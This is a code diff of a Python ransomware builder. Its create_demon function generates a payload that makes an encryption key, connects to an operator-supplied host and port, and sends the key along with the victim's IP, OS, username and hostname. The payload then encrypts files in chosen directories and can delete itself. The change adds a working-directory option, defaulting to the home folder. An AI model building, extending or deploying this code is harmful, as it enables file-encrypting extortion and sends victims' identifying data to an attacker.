@@ -1,6 +1,6 @@
 import platform
 
-def create_demon(host, port, fullscreen, demo, type, msg, img_base64, mode, debug, ext, dirs, destruct):
+def create_demon(host, port, fullscreen, demo, type, msg, img_base64, mode, debug, ext, dirs, destruct, working_dir):
     demon = """import os, sys, socket, string, random, hashlib, getpass, platform, threading, datetime, time, base64
 <import_pil>
 from pathlib import Path
@@ -32,9 +32,9 @@ port = <port>
 key = hashlib.md5(gen_string().encode('utf-8')).hexdigest()
 key = key.encode('utf-8')
 
-global os
+global os_platform
 global name
-os = platform.system()
+os_platform = platform.system()
 hostname = platform.node()
 
 # Encrypt file that endswith
@@ -78,7 +78,7 @@ def connector():
     try:
         # Send Key
         server.connect((host, port))
-        msg = '%s$%s$%s$%s$%s' % (getlocalip(), os, key, getpass.getuser(), hostname)
+        msg = '%s$%s$%s$%s$%s' % (getlocalip(), os_platform, key, getpass.getuser(), hostname)
         server.send(msg.encode('utf-8'))
 
         <encrypt>
@@ -173,6 +173,13 @@ from io import BytesIO
         if not line == '':
             dir_list = dir_list + "%s" % ("'" + line + "',\n")
     demon = demon.replace('<dirs>', dir_list)
+
+    if working_dir == '$HOME':
+        demon = demon.replace('<working_dir>', "str(Path.home()) + '/'")
+    else:
+        if not working_dir.endswith('/'):
+            working_dir = working_dir + '/'
+        demon = demon.replace('<working_dir>', "'" + working_dir + "'")
 
     if destruct == 1:
         demon = demon.replace('<destruct>', 'os.remove(sys.argv[0])')
